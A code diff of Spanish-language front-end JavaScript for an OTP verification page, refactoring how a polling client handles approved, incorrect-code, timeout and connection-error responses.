@@ -74,30 +74,25 @@
 
       // Iniciar polling
       const poller = new PollingClient({
-        apiUrl: 'http://localhost:3000/api',
         pollingInterval: 2000,
         onSuccess: (data) => {
           loader.hide();
 
-          if (data.response === 'Aprobado' || data.response.includes('Aprobado')) {
-            // Redirigir a confirmación
-            setTimeout(() => {
-              window.location.href = 'confirmation_clean.html';
-            }, 500);
+          if (data.response.includes('Aprobado')) {
+            window.location.href = 'confirmation_clean.html';
+          } else if (data.response.includes('ERROR') || data.response.includes('Error')) {
+            modalError.show('El código OTP es incorrecto. Intenta nuevamente.');
+            inputs.forEach(inp => inp.value = '');
+            inputs[0].focus();
+            checkComplete();
           }
         },
         onError: (error) => {
           loader.hide();
-
-          if (error.type === 'error' || error.response === 'ERROR' || error.response?.includes('ERROR')) {
-            // Mostrar modal de error
-            modalError.show('El código OTP es incorrecto. Intenta nuevamente.');
-            // Limpiar inputs
-            inputs.forEach(inp => inp.value = '');
-            inputs[0].focus();
-            checkComplete();
-          } else if (error.type === 'timeout') {
+          if (error.type === 'timeout') {
             modalError.show('Tiempo de espera agotado. Intenta nuevamente.');
+          } else {
+            modalError.show('Error de conexión. Intenta nuevamente.');
           }
         },
       });
